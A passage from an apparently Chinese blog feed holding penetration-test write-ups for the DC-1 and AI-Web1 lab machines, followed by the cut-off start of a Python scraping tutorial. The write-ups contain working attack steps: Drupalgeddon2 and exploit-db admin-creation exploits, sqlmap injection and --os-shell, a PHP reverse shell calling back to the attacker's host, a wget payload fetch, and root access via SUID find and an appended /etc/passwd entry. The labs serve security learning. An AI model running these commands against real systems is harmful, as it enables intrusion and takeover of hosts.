        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或者</span><br><span class="line">netdiscover -r 192.168.174.0/24  --排除1，2，254</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313195746995.png" alt="image-20240313195746995"></p><p>得到目标IP：<strong>192.168.174.145</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -sV -O -A -p- 192.168.174.145</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36735/udp   status</span><br><span class="line">|   100024  1          42162/tcp6  status</span><br><span class="line">|   100024  1          57533/tcp   status</span><br><span class="line">|_  100024  1          58225/udp6  status</span><br><span class="line">57533/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7E:64:DD (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     </span><br></pre></td></tr></table></figure><ul><li>22算口，开放了ssh服务，OpenSSH 6.0p1</li><li>80端口，存在web服务，Apache httpd 2.2.22，Drupal 7</li><li>111端口，开放了rpcbind服务</li></ul><p>补充知识：Drupal由php语言编写的cms，rpcbind是NFS中用来进行消息通知的服务</p><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313200659949.png" alt="image-20240313200659949"></p><p>可以看到是一个登陆界面，可能存在sql注入漏洞或弱口令，</p><h3 id="1-4-利用MSF渗透"><a href="#1-4-利用MSF渗透" class="headerlink" title="1.4. 利用MSF渗透"></a>1.4. 利用MSF渗透</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSF简单指令</span><br><span class="line">msfconsole进入MSF控制台</span><br><span class="line">search 搜索相应模块</span><br><span class="line">use           对应模块</span><br><span class="line">show options  查看信息</span><br><span class="line">set RHOST  远程主机ip</span><br><span class="line">run           攻击</span><br></pre></td></tr></table></figure><h4 id="1-4-1-搜索Drupal-7的漏洞"><a href="#1-4-1-搜索Drupal-7的漏洞" class="headerlink" title="1.4.1. 搜索Drupal 7的漏洞"></a>1.4.1. 搜索Drupal 7的漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Drupa 7</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313201413144.png" alt="image-20240313201413144"></p><p>可以发现能利用的漏洞非常多</p><h4 id="1-4-2-进入MSF控制台搜索drupal模块"><a href="#1-4-2-进入MSF控制台搜索drupal模块" class="headerlink" title="1.4.2. 进入MSF控制台搜索drupal模块"></a>1.4.2. 进入MSF控制台搜索drupal模块</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313201539370.png" alt="image-20240313201539370"></p><h4 id="1-4-3-选择模块进行测试"><a href="#1-4-3-选择模块进行测试" class="headerlink" title="1.4.3. 选择模块进行测试"></a>1.4.3. 选择模块进行测试</h4><p>用2018的试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><h4 id="1-4-4-设置靶机IP运行msf"><a href="#1-4-4-设置靶机IP运行msf" class="headerlink" title="1.4.4 设置靶机IP运行msf"></a>1.4.4 设置靶机IP运行msf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.174.145</span><br><span class="line">run </span><br></pre></td></tr></table></figure><h4 id="1-4-5-进入shell"><a href="#1-4-5-进入shell" class="headerlink" title="1.4.5 进入shell"></a>1.4.5 进入shell</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313201920626.png" alt="image-20240313201920626"></p><p>但不是root权限，不妨先find一下flag问价</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -iname &quot;*flag*&quot;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313202242817.png" alt="image-20240313202242817"></p><p>有点多，先把带txt的过滤出来</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313202404685.png" alt="image-20240313202404685"></p><p>先找一下这三个</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313202717938.png" alt="image-20240313202717938"></p><p>可以看到其中只有flag1.txt是我们能访问的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">每个好的CMS都需要一个配置文件——你也一样。</span><br></pre></td></tr></table></figure><p>通过这个线索我们可以区找一下这个cms的配置文件，但这个界面确实不怎么好看，使用python反弹一个交互式shell TTY。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313203341574.png" alt="image-20240313203341574"></p><p>搜索发现drupal的配置文件是 &#x2F;sites&#x2F;default&#x2F;settings.php ，是数据库连接配置文件。</p><p>去看一下能不能看到这个文件的信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313203955072.png" alt="image-20240313203955072"></p><p>可以看到数据库的账号密码,英文意思如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破攻击和字典攻击不是</span><br><span class="line">获得访问权限的唯一方法(您将需要访问权限)。</span><br><span class="line">你能用这些证书做什么?</span><br></pre></td></tr></table></figure><h4 id="登陆数据库"><a href="#登陆数据库" class="headerlink" title="登陆数据库"></a>登陆数据库</h4><p><strong>Drupal框架默认的用户表就是users表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t</span><br><span class="line">show databses; --发现drup数据库</span><br><span class="line">show tables; --发现users表</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313204216786.png" alt="image-20240313204216786"></p><p>发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal 6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p><p>这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p><h5 id="方法一重置密码"><a href="#方法一重置密码" class="headerlink" title="方法一重置密码"></a>方法一重置密码</h5><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313205708345.png" alt="image-20240313205708345"></p><p>不知道为什么我用这个会报错说文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456</span><br><span class="line">php ./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">password: 123456                hash: $S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa</span><br></pre></td></tr></table></figure><p>原来要在根目录下使用</p><p>在指定目录下执行脚本是为了确保脚本能够正确加载所需的文件和依赖项。在Drupal中，脚本需要包含Drupal的核心文件和库才能生成正确的密码哈希。一般情况下，Drupal的根目录包含<code>index.php</code>文件和<code>sites</code>目录。</p><p>得到后，再把他写入数据库中</p><p>mysql -h是MySQL命令行客户端中的参数，用于指定要连接的MySQL服务器的主机名或IP地址。在命令行中，-h后面可以跟上要连接的MySQL服务器的主机名或IP地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u dbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p>然后把密码写如user表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&quot;$S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313211312372.png" alt="image-20240313211312372"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313211331364.png" alt="image-20240313211331364"></p><h5 id="方法二，利用漏洞添加admin用户"><a href="#方法二，利用漏洞添加admin用户" class="headerlink" title="方法二，利用漏洞添加admin用户"></a>方法二，利用漏洞添加admin用户</h5><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313213434032.png" alt="image-20240313213434032"></p><p>但有版本要求，所以我们需要先查看drupal的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313214051628.png" alt="image-20240313214051628"></p><p>7.21是可以利用该漏洞的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.145 -u youzipii -p 123123</span><br><span class="line">需要注意用python3会报错，要用python2执行</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313214725060.png"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313214901260.png" alt="image-20240313214901260"></p><p>可以看到也登陆进来了</p><h4 id="1-4-6-flag3"><a href="#1-4-6-flag3" class="headerlink" title="1.4.6 flag3"></a>1.4.6 flag3</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215010627.png" alt="image-20240313215010627"></p><p>翻译一下：特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容 </p><p>别人说很明显的提示：find+perms+exec 命令用来提权</p><h4 id="1-4-7-flag4"><a href="#1-4-7-flag4" class="headerlink" title="1.4.7 flag4"></a>1.4.7 flag4</h4><p>根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在&#x2F;etc&#x2F;passwd目录下。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215214862.png" alt="image-20240313215214862"></p><p><strong>注意，&#x2F;etc&#x2F;passwd包含系统所有账户信息，只有超级用户才有写和访问。该文件每个用户占一行用，分隔成七个字段。如下图所示：</strong></p><p><img src="https://img2020.cnblogs.com/blog/1962254/202007/1962254-20200713224545400-294633646.png" alt="img"></p><p>切换到home目录寻找flag4相关文件,并尝试查看。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215341017.png" alt="image-20240313215341017"></p><p><strong>提示最后flag in root下面。</strong></p><h4 id="1-4-8-提权-获得最终flag"><a href="#1-4-8-提权-获得最终flag" class="headerlink" title="1.4.8 提权+获得最终flag"></a><strong>1.4.8 提权+获得最终flag</strong></h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215633609.png" alt="image-20240313215633609"></p><p>下面就是提权了</p><p>根据flag3中的提示，使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. <span class="built_in">touch</span> bcce有可能不能创建</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215833812.png" alt="image-20240313215833812"></p><p>访问最后一个flag</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240313215921134.png" alt="image-20240313215921134"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ai-web1通关记录</title>
      <link href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="AI-Web1通关记录"><a href="#AI-Web1通关记录" class="headerlink" title="AI-Web1通关记录"></a>AI-Web1通关记录</h1><p><strong>学习自<a href="https://blog.csdn.net/qq_51577576?type=blog">_PowerShell</a></strong></p><p><strong>靶机地址：192.168.174.134</strong></p><p><strong>kali地址：192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nmap -sn 192.168.174.0/24 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:30 CST</span><br><span class="line">Nmap scan report for 192.168.174.2</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Nmap scan report for 192.168.174.134</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Nmap scan report for 192.168.174.137</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 5.09 seconds</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap -T4 -sV -O -A -p- 192.168.174.134</span><br><span class="line">[sudo] password for eraser: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:36 CST</span><br><span class="line">Nmap scan report for 192.168.174.134</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/m3diNf0/ /se3reTdir777/uploads/</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: AI Web 1.0</span><br><span class="line">MAC Address: 00:0C:29:BD:8C:E3 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.71 ms 192.168.174.134</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds</span><br></pre></td></tr></table></figure><p>可以看到开放了一个80端口，以及一些网站目录，尝试访问一下</p><h3 id="访问目标页面"><a href="#访问目标页面" class="headerlink" title="访问目标页面"></a>访问目标页面</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312134058310.png" alt="image-20240312134058310"></p><p>谷歌都搜不到，没什么信息，继续看下其它目录有什么信息</p><h4 id="robots-txt资料"><a href="#robots-txt资料" class="headerlink" title="robots.txt资料"></a>robots.txt<a href="https://zhuanlan.zhihu.com/p/65463520">资料</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: /m3diNf0/</span><br><span class="line">Disallow: /se3reTdir777/uploads/</span><br></pre></td></tr></table></figure><p>查阅资料发现,robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p><ul><li>不要访问某个文件、文件夹</li><li>禁止某些爬虫的访问</li><li>限制爬虫访问网站的频率</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">robots.txt的内容</span><br><span class="line">User-agent: 爬虫的名称</span><br><span class="line">Disallow: 不允许爬虫访问的地址</span><br><span class="line">Allow: 允许爬虫访问的地址</span><br><span class="line">若User-agent是*，则表示对象是所有爬虫。</span><br></pre></td></tr></table></figure><p><a href="https://developers.google.com/search/docs/crawling-indexing/robots/intro?hl=zh-cn">官方文档</a></p><p>结合以上信息，&#x2F;m3diNf0&#x2F;和&#x2F;se3reTdir777&#x2F;uploads&#x2F;是不希望访问的目录，推测里面有重要信息，但不知道具体内容，扫描下网站目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# dirb http://192.168.174.134/m3diNf0/ </span><br><span class="line">+ http://192.168.174.134/m3diNf0/info.php (CODE:200|SIZE:84305)     </span><br><span class="line">.....</span><br><span class="line">└─# dirb http://192.168.174.134/se3reTdir777            </span><br><span class="line">---- Scanning URL: http://192.168.174.134/se3reTdir777/ ----</span><br><span class="line">+ http://192.168.174.134/se3reTdir777/index.php (CODE:200|SIZE:1228) </span><br><span class="line">...     </span><br></pre></td></tr></table></figure><p>可以看到前一个目录下有个info.php文件，后一个目录下有个index.php,分别尝试访问，</p><h2 id="x2F-m3diNf0"><a href="#x2F-m3diNf0" class="headerlink" title="&#x2F;m3diNf0"></a>&#x2F;m3diNf0</h2><h3 id="info-php"><a href="#info-php" class="headerlink" title="info.php"></a>info.php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312140833736.png" alt="image-20240312140833736"></h3><p>发现绝对路径：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;m3diNf0&#x2F;info.php </p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>一个是个看着很明显的sql注入界面，输入1提交一下，有回显</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312141051083.png" alt="image-20240312141051083"></p><p>判断是否存在注入点，输入分号试试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312141259232.png" alt="image-20240312141259232"></p><p>存在报错</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>这里我们先抓包，确认请求参数</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">POST /se3reTdir777/index.php HTTP/1.1</span><br><span class="line">Host: 192.168.174.134</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://192.168.174.134</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.174.134/se3reTdir777/index.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">uid=1&amp;Operation=Submit</span><br></pre></td></tr></table></figure><p>可以看到注入参数为“uid&#x3D;1&amp;Operation&#x3D;Submit”</p><p>下面用sqlmap爆破数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312144608515.png" alt="image-20240312144608515"></p><p>看看aiweb1里的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312144720285.png" alt="image-20240312144720285"></p><p>看看表里的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T user --dump</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312145259001.png" alt="image-20240312145259001"></p><p>没什么有用信息</p><p>尝试使用sqlmap的–os-shell命令</p><p>os-shell执行条件有三个：<br>　 1.网站必须是root权限<br>　 2.网站的绝对路径已知<br>　 3.GPC为off（php主动转义的功能关闭）</p><p>依次选择 php(default)，custom location(s)<br>根据前面找到的info.php文件暴露的信息，绝对路径选择：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F;<br>uploads的目录是可以成功写入的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777&quot; --data &#x27;uid=1&amp;Operation=Submit&#x27; --level=3 --os-shell</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312150251817.png" alt="image-20240312150251817"></p><p>成功反弹到shell，但是权限极低，面临提权问题</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>准备好一个提权脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock=fsockopen(&quot;192.168.174.137&quot;,8888);</span><br><span class="line">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>使用python搭建一个简易的服务器</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">9966</span></span><br><span class="line"><span class="comment">#9966为端口号，可自己指定</span></span><br></pre></td></tr></table></figure><p>此时简易服务器已搭建完成，接下来打开网页，访问本机，查看搭建是否成功</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312151128619.png" alt="image-20240312151128619"></p><p><strong>下载文件到靶机</strong></p><p>回到我们控制目标shell的窗口，下载文件</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">wget -S http://192.168.174.137:9966/test.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312151226436.png" alt="image-20240312151226436"></p><p>有时候可能会出现异常，多试几次就可以了。再打开一个终端，对8888端口进行监听：<strong>nc -lvp 8888</strong>,之后就直接运行文件 <strong>php shell.php</strong> 就可成功反弹shell</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312151346480.png" alt="image-20240312151346480"></p><p><strong>提权到root</strong></p><p>可以用python转换成交互式shell，这样看着更舒服</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312152427442.png" alt="image-20240312152427442"></p><p>发现当前用户不是root用户但是这个用户可以对&#x2F;etc&#x2F;passwd 文件进行写入权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312152835669.png" alt="image-20240312152835669"></p><p>所以我们尝试添加一个用户登录，因为写入的时候密码是加密的，所以要先加密密码,：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt web1 123456   //用openssl生成用户，用户名为panda ，密码为 panda</span><br><span class="line">$1$web1$ZrYgDZgZpLlsnVlxUaZwh/   //生成后/etc/passwd储存用户格式的文件</span><br><span class="line">panda:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0:root:/root:/bin/bash  //写入/etc/passwd文件的格式</span><br></pre></td></tr></table></figure><p>然后再来写入密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#x27;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312153132553.png" alt="image-20240312153132553"></p><p>切换用户到我们刚刚自己创建的 web1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312153441484.png" alt="image-20240312153441484"></p><p>查看权限，已经是root权限，并且成功拿取到flag</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312153548149.png" alt="image-20240312153548149"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240312153911324.png" alt="image-20240312153911324"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2024/03/15/python%E7%88%AC%E8%99%AB/"/>
      <url>/2024/03/15/python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://requests.readthedocs.io/projects/cn/zh-cn/latest/">python request官方文档</a></p><h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h2 id="爬百度翻译"><a href="#爬百度翻译" class="headerlink" title="爬百度翻译"></a>爬百度翻译</h2><p>在翻译网站随便输入个中文翻译，然后按F12</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240315222830216.png" alt="image-20240315222830216"></p><p>知道带正确返回的值，然后查看标头，就能知道url了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240315222919311.png" alt="image-20240315222919311"></p><p>然后也要注意请求方法，对于参数我们可以去payload（载荷）看</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240315223000282.png" alt="image-20240315223000282"></p><p>之前找错了，那个表单有个sign和ts（时间戳），这两个是会变化的值，在写data的时候不容易弄，发现sug里有个更简单的表单数据，就用这个了，下面是代码.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># timestamp = time.time()</span></span><br><span class="line"><span class="comment"># print(&quot;当前时间戳：&quot;, timestamp)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    word = <span class="built_in">input</span>(<span 